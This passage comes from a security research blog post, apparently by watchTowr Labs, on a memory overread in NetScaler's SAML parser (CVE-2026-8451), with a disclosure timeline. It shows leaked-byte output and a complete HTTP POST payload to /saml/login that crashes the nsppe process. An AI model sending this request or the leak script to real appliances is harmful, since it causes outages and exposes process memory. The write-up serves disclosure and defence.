Take a look at the ACSURL value. It now contains binary data that should never have been returned to us, including the unmistakable 0xdeadbeef fill pattern.

Our overread has worked.

The parser has read beyond the end of the XML buffer, and we've successfully tricked NetScaler into returning memory that was never supposed to leave the process. Completely unpredictably.

It’s never done that before (lol)

![image](https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/06/image-37.png)

One thing we’re keen to note: in contrast to the original CVE-2026-3055, in which kilobytes of binary data can be leaked, this overread will terminate the out-of-bounds read when various control characters are read, such as NULL (or even >).

In practice, we found that by varying the request length, we could consistently squeeze a few bytes out of the server:

```
c:\>python watchTowr-vs-Netscaler-CVE-2026-8451.py <https://192.168.80.125>
..
Leaked bytes:
00000000  f0 0d 90 de de de de de de de de de de de de de   |................|
00000010  de de de de de de de de de de de de de de de de   |................|
00000020  de de de de de de de de de de de de de de de de   |................|
00000030  de de de de de de de de de de de de de de de de   |................|
00000040  de de de de de de de de de de de de de de ed a7   |................|
00000050  0c a1 35 00                                       |..5.|
..
```

There’s clearly data leaking here (0xf00d!) and, interestingly, what appears to be a data pointer (0xa10ca7ed).

We can't say with certainty what this pointer references, but it certainly looks plausible. If it is a valid process pointer, then this bug graduates from a simple information disclosure to a genuine infoleak primitive. Paired with a suitable memory corruption vulnerability, it could be exactly the kind of building block needed for a full device compromise.

Of course, if you're more interested in demonstrating impact than building exploit chains, there is a much easier route, as naturally in enterprise-grade security appliances, requests as simple as the following are enough to reliably crash the target system:

```
<samlp:AuthnRequest ID=
```

```
POST /saml/login HTTP/1.1
Host: 192.168.80.125
Content-Length: 46

SAMLRequest=PHNhbWxwOkF1dGhuUmVxdWVzdCBJRD0%3D
```

This request causes the nsppe process to "crash out":

![image](https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/06/image-38.png)

![image](https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/06/image-39.png)

### Detection Artefact Generator

As always, we’re here to share our Detection Artefact Generator to determine your own susceptibility and inform remediation in your own environments. It can be found on our GitHub here.

```
c:\>python watchTowr-vs-Netscaler-CVE-2026-8451.py <https://all-ur-boxen.com>
..
Leaked bytes:
00000000  f0 0d 90 de de de de de de de de de de de de de   |................|
00000010  de de de de de de de de de de de de de de de de   |................|
00000020  de de de de de de de de de de de de de de de de   |................|
00000030  de de de de de de de de de de de de de de de de   |................|
00000040  de de de de de de de de de de de de de de ed a7   |................|
00000050  0c a1 35 00                                       |..5.|
..
```

### Thanks, PolyMarket

![image](https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/06/image-40.png)

We get to eat tonight!

### Timeline

 kg-card-begin: html
   Date Detail     28th March 2026 watchTowr discovers issue, notifies Citrix and affected clients   28th March 2026 Citrix responds with what appears to be an automatic reply   30th April 2026 watchTowr requests update from Citrix   7th May 2026 watchTowr again requests update from Citrix   7th May 2026 Citrix advises that a fix is being developed   14 June 2026 Citrix advise they expect to publish on 29th June   25th June 2026 Citrix advises that a fix may be delayed by ‘a few days’; watchTowr responds that this is acceptable   30th June 2026 Citrix publish advisory and patches   30th June 2026 watchTowr publishes research, and memes
 kg-card-end: html

## Gain early access to our research, and understand your exposure, with the watchTowr Platform

The research published by watchTowr Labs is powered by the same engine behind the watchTowr Platform, our Preemptive Exposure Management solution built for enterprises that refuse to wait for the next satisfying advisory from their scanner vendor.

The watchTowr Platform combines External Attack Surface Management and Continuous Automated Red Teaming to test your defenses against the vulnerabilities and techniques that matter: the ones real attackers are actually exploiting.

 Request a demo
